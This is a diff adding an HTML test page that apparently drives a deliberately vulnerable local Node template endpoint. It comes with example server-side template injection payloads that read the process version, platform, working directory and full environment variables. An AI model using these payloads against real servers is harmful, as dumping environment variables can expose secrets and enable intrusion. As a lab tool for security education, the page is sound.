@@ -1,0 +1,90 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>SSTI Vulnerability Test</title>
+  <style>
+    body{font-family:system-ui,-apple-system,'Segoe UI',Roboto,'Helvetica Neue',Arial;background:#f7fafc;color:#0f172a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
+    .card{background:#fff;border-radius:10px;box-shadow:0 6px 18px rgba(15,23,42,0.08);padding:20px;max-width:500px;width:100%}
+    h1{font-size:20px;margin:0 0 16px;color:#1e293b}
+    .warning{background:#fef3c7;border:1px solid #f59e0b;border-radius:6px;padding:12px;margin-bottom:16px;font-size:14px;color:#92400e}
+    .form-group{margin-bottom:16px}
+    label{display:block;margin-bottom:6px;font-size:14px;font-weight:500;color:#374151}
+    input[type="text"]{width:100%;padding:10px;border:1px solid #d1d5db;border-radius:6px;font-size:14px;box-sizing:border-box}
+    input[type="text"]:focus{outline:none;border-color:#0ea5a4;box-shadow:0 0 0 3px rgba(14,165,164,0.1)}
+    button{background:#0ea5a4;color:white;border:none;padding:10px 20px;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;width:100%}
+    button:hover{background:#0d9488}
+    .result{margin-top:16px;padding:12px;background:#f1f5f9;border-radius:6px;min-height:60px;white-space:pre-wrap;font-family:monospace;font-size:13px}
+    .examples{margin-top:16px;padding:12px;background:#f8fafc;border-radius:6px;border:1px solid #e2e8f0}
+    .examples h3{margin:0 0 8px;font-size:14px;color:#475569}
+    .example{background:#fff;padding:8px;margin:4px 0;border-radius:4px;border:1px solid #e2e8f0;font-family:monospace;font-size:12px;cursor:pointer}
+    .example:hover{background:#f1f5f9}
+  </style>
+</head>
+<body>
+  <div class="card" role="main">
+    <h1>Server-Side Template Injection (SSTI) Test</h1>
+    
+    <div class="warning">
+      ⚠️ <strong>Warning:</strong> This is a vulnerability demonstration. Only use in controlled environments for educational purposes.
+    </div>
+
+    <form id="sstiForm">
+      <div class="form-group">
+        <label for="payload">SSTI Payload:</label>
+        <input type="text" id="payload" placeholder="Enter your SSTI payload here..." />
+      </div>
+      
+      <button type="submit">Execute Payload</button>
+    </form>
+
+    <div class="result" id="result">Result will appear here...</div>
+
+    <div class="examples">
+      <h3>Example Payloads:</h3>
+      <div class="example" onclick="setPayload('<%= 7*7 %>')">Basic Math: &lt;%= 7*7 %&gt;</div>
+      <div class="example" onclick="setPayload('<%= global.process.version %>')">Node Version: &lt;%= global.process.version %&gt;</div>
+      <div class="example" onclick="setPayload('<%= global.process.platform %>')">Platform: &lt;%= global.process.platform %&gt;</div>
+      <div class="example" onclick="setPayload('<%= global.process.cwd() %>')">Current Directory: &lt;%= global.process.cwd() %&gt;</div>
+      <div class="example" onclick="setPayload('<%= global.process.env %>')">Environment Variables: &lt;%= global.process.env %&gt;</div>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('sstiForm');
+    const payloadInput = document.getElementById('payload');
+    const resultDiv = document.getElementById('result');
+
+    function setPayload(payload) {
+      payloadInput.value = payload;
+    }
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      
+      const payload = payloadInput.value.trim();
+      if (!payload) {
+        resultDiv.textContent = 'Please enter a payload.';
+        return;
+      }
+
+      // Encode the payload for URL
+      const encodedPayload = encodeURIComponent(payload);
+      const url = `http://localhost:3000/?payload=${encodedPayload}`;
+      
+      resultDiv.textContent = 'Loading...';
+      
+      // Make request to the vulnerable endpoint
+      fetch(url)
+        .then(response => response.text())
+        .then(data => {
+          resultDiv.textContent = data;
+        })
+        .catch(error => {
+          resultDiv.textContent = `Error: ${error.message}\n\nMake sure the server is running on http://localhost:3000`;
+        });
+    });
+  </script>
+</body>
+</html>
